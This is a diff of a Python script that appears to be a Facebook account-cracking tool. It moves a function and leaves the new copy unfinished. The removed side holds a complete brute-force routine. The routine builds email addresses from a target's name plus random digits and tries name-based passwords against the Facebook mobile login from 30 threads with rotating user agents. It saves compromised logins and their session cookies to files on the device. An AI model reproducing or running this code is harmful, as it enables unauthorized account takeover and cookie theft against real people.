@@ -504,6 +504,37 @@ def bd():
 	print(47*"-")
 	input('Press Inter To Back Menu')
 	fia()
+	#___________
+def gml():
+    user=[]
+    os.system('clear')
+    print(logo)
+    kode = input(' [?] Target fast name : ')
+    os.system('clear')
+    print(logo)
+    kodex = input(' [?] Target last name :  ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    doamin = input(' [?] Terget doamin : ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input('[?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;92m[+] Total ids:\033[1;36m '+tl)
+        print(' \033[1;96m[+] Process has been started')
+        print(' \033[1;91m[!] Wait for ids ')
+        print(' \033[1;95m[!] Use flight mode for speed up ')
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 #_____
 def fcrack(uid,pwx,tl):
 	#print(user)
@@ -568,107 +599,5 @@ def fcrack(uid,pwx,tl):
 		loop+=1
 	except:
 		pass
-    
-#___________
-def gml():
-    user=[]
-    os.system('clear')
-    print(logo)
-    kode = input(' [?] Target fast name : ')
-    os.system('clear')
-    print(logo)
-    kodex = input(' [?] Target last name :  ')
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    doamin = input(' [?] Terget doamin : ')
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    limit = int(input('[?] Crack Limit : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print(' \033[1;92m[+] Total ids:\033[1;36m '+tl)
-        print(' \033[1;96m[+] Process has been started')
-        print(' \033[1;91m[!] Wait for ids ')
-        print(' \033[1;95m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        for guru in user:
-            uid = kode+kodex+guru+doamin
-            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(' [+] Crack process has been completed')
-    print(' [+] Ids saved in ok.txt,cp.txt')
-def rcrack1(uid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            sys.stdout.write('\r[\033[1;32mALAHI\033[1;92m] > [%s/%s] > [OK\033[1;96m:-\033[1;92m%s\033[1;35m] - [CP\033[1;32m:-\033[1;91m%s\033[1;33m] \r'%(loop,tl,len(oks),len(cps))),
-            sys.stdout.flush()
-            free_fb = session.get('https://m.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb ={'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'dpr': '2',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"RMX2101"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print(f"\033[38;5;46m[M4Z1-OK] {uid} | {ps}")
-                print(f" Cookie : {coki}")
-                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(uid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-                print(f"\x1b[38;5;196m[M4Z1-CP] {cid}|{ps}")
-                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write(f'\r\033[m[ALAHI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-        sys.stdout.flush()
-    except:
-        pass
     
 fia()
